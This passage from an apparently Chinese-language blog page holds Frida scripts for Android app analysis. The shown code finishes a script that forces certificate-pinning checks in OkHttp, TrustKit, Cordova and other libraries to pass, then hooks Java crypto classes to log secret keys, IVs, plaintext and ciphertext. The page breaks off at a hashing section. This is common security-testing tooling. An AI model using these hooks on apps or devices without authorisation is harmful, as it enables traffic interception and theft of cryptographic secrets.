class="hljs-built_in">console</span>.log(<span class="hljs-number">111</span>)<br>        <span class="hljs-comment">// Generic SSL Pinning Bypass tested on Android 5, 5,1, 6</span><br>        <span class="hljs-comment">// https://codeshare.frida.re/@akabe1/frida-universal-pinning-bypasser/</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">var</span> OpenSSLSocketImpl = Java.use(<span class="hljs-string">&#x27;com.android.org.conscrypt.OpenSSLSocketImpl&#x27;</span>);<br>            OpenSSLSocketImpl.verifyCertificateChain.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">certRefs, authMethod</span>) </span>&#123;<br>                send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] OpenSSLSocketImpl.verifyCertificateChain() bypassed&#x27;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] OpenSSLSocketImpl.verifyCertificateChain() not found&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 3rd Party Pinning</span><br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">var</span> OkHttpClient = Java.use(<span class="hljs-string">&quot;com.squareup.okhttp.OkHttpClient&quot;</span>);<br>        OkHttpClient.setCertificatePinner.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">certificatePinner</span>)</span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] OkHttpClient.setCertificatePinner() bypassed&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;;<br>        <span class="hljs-comment">// Invalidate the certificate pinnet checks (if &quot;setCertificatePinner&quot; was called before the previous invalidation)</span><br>        <span class="hljs-keyword">var</span> CertificatePinner = Java.use(<span class="hljs-string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>);<br>        CertificatePinner.check.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;[Ljava.security.cert.Certificate;&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p0, p1</span>)</span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] CertificatePinner.check() 1 bypassed&#x27;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;;<br>        CertificatePinner.check.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.util.List&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p0, p1</span>)</span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] CertificatePinner.check() 2 bypassed&#x27;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] okhttp CertificatePinner not found&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> CertificatePinner2 = Java.use(<span class="hljs-string">&#x27;okhttp3.CertificatePinner&#x27;</span>);<br>        CertificatePinner2.check.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.util.List&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">str</span>) </span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] okhttp3.CertificatePinner.check() bypassed for &#x27;</span> + str);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] okhttp3 CertificatePinner not found&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// https://gist.github.com/cubehouse/56797147b5cb22768b500f25d3888a22</span><br>        <span class="hljs-keyword">var</span> dataTheorem = Java.use(<span class="hljs-string">&quot;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&quot;</span>);<br>        dataTheorem.verify.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">str</span>) </span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] DataTheorem trustkit.pinning.OkHostnameVerifier.verify() 1 bypassed for &#x27;</span> + str);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;;<br><br>        dataTheorem.verify.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.security.cert.X509Certificate&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">str</span>) </span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] DataTheorem trustkit.pinning.OkHostnameVerifier.verify() 2 bypassed for &#x27;</span> + str);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] DataTheorem trustkit not found&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> PinningTrustManager = Java.use(<span class="hljs-string">&#x27;appcelerator.https.PinningTrustManager&#x27;</span>);<br>        PinningTrustManager.checkServerTrusted.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] Appcelerator appcelerator.https.PinningTrustManager.checkServerTrusted() bypassed&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>       send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] Appcelerator PinningTrustManager not found&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> SSLCertificateChecker = Java.use(<span class="hljs-string">&#x27;nl.xservices.plugins.SSLCertificateChecker&#x27;</span>);<br>        SSLCertificateChecker.execute.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;org.json.JSONArray&#x27;</span>, <span class="hljs-string">&#x27;org.apache.cordova.CallbackContext&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">action, args, callbackContext</span>) </span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] Apache Cordova - SSLCertificateChecker.execute() bypassed&#x27;</span>);<br>            callbackContext.success(<span class="hljs-string">&quot;CONNECTION_SECURE&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] Apache Cordova SSLCertificateChecker not found&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">var</span> wultra = Java.use(<span class="hljs-string">&#x27;com.wultra.android.sslpinning.CertStore&#x27;</span>);<br>        wultra.validateFingerprint.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;[B&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">commonName, fingerprint</span>) </span>&#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] Wultra com.wultra.android.sslpinning.CertStore.validateFingerprint() bypassed&#x27;</span>);<br>            <span class="hljs-keyword">var</span> ValidationResult = Java.use(<span class="hljs-string">&#x27;com.wultra.android.sslpinning.ValidationResult&#x27;</span>);<br>            <span class="hljs-keyword">return</span> ValidationResult.TRUSTED;<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>        send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] Wultra CertStore.validateFingerprint not found&#x27;</span>);<br>    &#125;<br>&#125;, <span class="hljs-number">0</span>);  <br></code></pre></td></tr></table></figure><h2 id="android加密"><a href="#android加密" class="headerlink" title="android加密"></a>android加密</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 加密算法加解密</span><br><span class="hljs-comment">     */</span><br>     <br>    <span class="hljs-keyword">var</span> complete_bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br>    <span class="hljs-keyword">var</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">var</span> secretKeySpecDef = Java.use(<span class="hljs-string">&#x27;javax.crypto.spec.SecretKeySpec&#x27;</span>);<br>    <span class="hljs-keyword">var</span> ivParameterSpecDef = Java.use(<span class="hljs-string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherDef = Java.use(<span class="hljs-string">&#x27;javax.crypto.Cipher&#x27;</span>);<br>    <span class="hljs-keyword">var</span> Arrays = Java.use(<span class="hljs-string">&#x27;java.util.Arrays&#x27;</span>);<br><br>    <span class="hljs-keyword">var</span> jAndroidLog = Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>);<br>    <span class="hljs-keyword">var</span> jException = Java.use(<span class="hljs-string">&quot;java.lang.Exception&quot;</span>);<br><br>    <span class="hljs-keyword">var</span> threadef = Java.use(<span class="hljs-string">&#x27;java.lang.Thread&#x27;</span>);<br>    <span class="hljs-keyword">var</span> threadinstance = threadef.$new();<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Where</span>(<span class="hljs-params">stack</span>)</span>&#123;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; stack.length; ++i)&#123;<br>          <span class="hljs-built_in">console</span>.log(stack[i].toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">var</span> cipherDoFinal_1 = cipherDef.doFinal.overload();<br>    <span class="hljs-keyword">var</span> cipherDoFinal_2 = cipherDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherDoFinal_3 = cipherDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherDoFinal_4 = cipherDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherDoFinal_5 = cipherDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;[B&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherDoFinal_6 = cipherDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherUpdate_1 = cipherDef.update.overload(<span class="hljs-string">&#x27;[B&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherUpdate_2 = cipherDef.update.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherUpdate_3 = cipherDef.update.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;[B&#x27;</span>);<br>    <span class="hljs-keyword">var</span> cipherUpdate_4 = cipherDef.update.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>    <span class="hljs-keyword">var</span> secretKeySpecDef_init_1 = secretKeySpecDef.$init.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<br>    <span class="hljs-keyword">var</span> secretKeySpecDef_init_2 = secretKeySpecDef.$init.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<br>    <span class="hljs-keyword">var</span> ivParameterSpecDef_init_1 = ivParameterSpecDef.$init.overload(<span class="hljs-string">&#x27;[B&#x27;</span>);<br>    <span class="hljs-keyword">var</span> ivParameterSpecDef_init_2 = ivParameterSpecDef.$init.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>    <br>    secretKeySpecDef_init_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, alg</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> key = b2s(arr);<br>        <span class="hljs-keyword">var</span> byteArr = Arrays.toString(arr);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\n[*] &quot;</span>+alg + <span class="hljs-string">&quot; secret key, plaintext: &quot;</span> + key+<span class="hljs-string">&quot; byte[]: &quot;</span>+byteArr);<br>        <span class="hljs-keyword">return</span> secretKeySpecDef_init_1.call(<span class="hljs-built_in">this</span>, arr, alg);<br>    &#125;<br><br>    secretKeySpecDef_init_2.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, off, len, alg</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> key = b2s(arr);<br>        <span class="hljs-keyword">var</span> byteArr = Arrays.toString(arr);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\n[*] &quot;</span>+alg + <span class="hljs-string">&quot; secret key, plaintext: &quot;</span> + key+<span class="hljs-string">&quot; byte[]: &quot;</span>+byteArr);<br>        <span class="hljs-keyword">return</span> secretKeySpecDef_init_2.call(<span class="hljs-built_in">this</span>, arr, off, len, alg);<br>    &#125;<br><br> <span class="hljs-comment">/*</span><br><span class="hljs-comment">    ivParameterSpecDef_init_1.implementation = function(arr)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        var iv = b2s(arr);</span><br><span class="hljs-comment">        var byteArr = Arrays.toString(arr);</span><br><span class="hljs-comment">        console.log(&quot;[*] Creating IV, plaintext: : &quot;+iv+&quot; byte[]: &quot;+byteArr)</span><br><span class="hljs-comment">        return ivParameterSpecDef_init_1.call(this, arr);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    ivParameterSpecDef_init_2.implementation = function(arr, off, len)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        var iv = b2s(arr);</span><br><span class="hljs-comment">        var byteArr = Arrays.toString(arr);</span><br><span class="hljs-comment">        console.log(&quot;[*] Creating IV, plaintext: &quot; + iv +&quot; byte[]: &quot;+byteArr);</span><br><span class="hljs-comment">        return ivParameterSpecDef_init_2.call(this, arr, off, len);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    <br><br>    cipherDoFinal_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ret = cipherDoFinal_1.call(<span class="hljs-built_in">this</span>);<br>        info(<span class="hljs-built_in">this</span>.getIV(), <span class="hljs-built_in">this</span>.getAlgorithm(), complete_bytes, ret);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    cipherDoFinal_2.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">var</span> ret = cipherDoFinal_2.call(<span class="hljs-built_in">this</span>, arr);<br>        info(<span class="hljs-built_in">this</span>.getIV(), <span class="hljs-built_in">this</span>.getAlgorithm(), complete_bytes, ret);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    cipherDoFinal_3.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">var</span> ret = cipherDoFinal_3.call(<span class="hljs-built_in">this</span>, arr, a);<br>        info(<span class="hljs-built_in">this</span>.getIV(), <span class="hljs-built_in">this</span>.getAlgorithm(), complete_bytes, ret);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    cipherDoFinal_4.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a, b</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">var</span> ret = cipherDoFinal_4.call(<span class="hljs-built_in">this</span>, arr, a, b);<br>        info(<span class="hljs-built_in">this</span>.getIV(), <span class="hljs-built_in">this</span>.getAlgorithm(), complete_bytes, ret);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    cipherDoFinal_5.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a, b, c</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">var</span> ret = cipherDoFinal_5.call(<span class="hljs-built_in">this</span>, arr, a, b, c);<br>        info(<span class="hljs-built_in">this</span>.getIV(), <span class="hljs-built_in">this</span>.getAlgorithm(), complete_bytes, ret);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    cipherDoFinal_6.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a, b, c, d</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">var</span> ret = cipherDoFinal_6.call(<span class="hljs-built_in">this</span>, arr, a, b, c, d);<br>        info(<span class="hljs-built_in">this</span>.getIV(), <span class="hljs-built_in">this</span>.getAlgorithm(), complete_bytes, c);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    cipherUpdate_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">return</span> cipherUpdate_1.call(<span class="hljs-built_in">this</span>, arr);<br>    &#125;<br><br>    cipherUpdate_2.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a, b</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">return</span> cipherUpdate_2.call(<span class="hljs-built_in">this</span>, arr, a, b);<br>    &#125;<br> <br>    cipherUpdate_3.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a, b, c</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">return</span> cipherUpdate_3.call(<span class="hljs-built_in">this</span>, arr, a, b, c);<br>    &#125;<br><br>    cipherUpdate_4.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr, a, b, c, d</span>) </span>&#123;<br>        addtoarray(arr);<br>        <span class="hljs-keyword">return</span> cipherUpdate_4.call(<span class="hljs-built_in">this</span>, arr, a, b, c, d);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">info</span>(<span class="hljs-params">iv, alg, plain, encoded</span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\n[*] ------------------------------------------&quot;</span>+alg+<span class="hljs-string">&quot;---------------------------------------------&quot;</span>)<br>        <span class="hljs-keyword">var</span> stack = threadinstance.currentThread().getStackTrace();<br>        Where(stack)<br>        <span class="hljs-keyword">if</span> (iv) &#123;<br>            <span class="hljs-keyword">var</span> byteArr = Arrays.toString(iv);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Initialization Vector: &quot;</span> + b2s(iv) +  <span class="hljs-string">&quot; byte[]: &quot;</span>+byteArr);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Initialization Vector: &quot;</span> + iv);<br>        &#125;<br>        <br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Algorithm: &quot;</span> + alg);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] In: &quot;</span> + b2s(plain));<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Out: &quot;</span> + b2s(encoded));<br>        complete_bytes = [];<br>        index = <span class="hljs-number">0</span>;<br>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] -----------------------------------------------------------------------------------------&quot;</span>)<br>       <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexdump</span>(<span class="hljs-params">buffer, blockSize</span>) </span>&#123;<br>        blockSize = blockSize || <span class="hljs-number">16</span>;<br>        <span class="hljs-keyword">var</span> lines = [];<br>        <span class="hljs-keyword">var</span> hex = <span class="hljs-string">&quot;0123456789ABCDEF&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> b = <span class="hljs-number">0</span>; b &lt; buffer.length; b += blockSize) &#123;<br>            <span class="hljs-keyword">var</span> block = buffer.slice(b, <span class="hljs-built_in">Math</span>.min(b + blockSize, buffer.length));<br>            <span class="hljs-keyword">var</span> addr = (<span class="hljs-string">&quot;0000&quot;</span> + b.toString(<span class="hljs-number">16</span>)).slice(-<span class="hljs-number">4</span>);<br>            <span class="hljs-keyword">var</span> codes = block.split(<span class="hljs-string">&#x27;&#x27;</span>).map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">ch</span>) </span>&#123;<br>                <span class="hljs-keyword">var</span> code = ch.charCodeAt(<span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span> + hex[(<span class="hljs-number">0xF0</span> &amp; code) &gt;&gt; <span class="hljs-number">4</span>] + hex[<span class="hljs-number">0x0F</span> &amp; code];<br>            &#125;).join(<span class="hljs-string">&quot;&quot;</span>);<br>            codes += <span class="hljs-string">&quot;   &quot;</span>.repeat(blockSize - block.length);<br>            <span class="hljs-keyword">var</span> chars = block.replace(<span class="hljs-regexp">/[\\x00-\\x1F\\x20]/g</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            chars += <span class="hljs-string">&quot; &quot;</span>.repeat(blockSize - block.length);<br>            lines.push(addr + <span class="hljs-string">&quot; &quot;</span> + codes + <span class="hljs-string">&quot;  &quot;</span> + chars);<br>        &#125;<br>        <span class="hljs-keyword">return</span> lines.join(<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b2s</span>(<span class="hljs-params">array</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;<br>            result += <span class="hljs-built_in">String</span>.fromCharCode(modulus(array[i], <span class="hljs-number">256</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">modulus</span>(<span class="hljs-params">x, n</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> ((x % n) + n) % n;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addtoarray</span>(<span class="hljs-params">arr</span>) </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            complete_bytes[index] = arr[i];<br>            index = index + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="android哈希"><a href="#android哈希" class="headerlink" title="android哈希"></a>android哈希</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 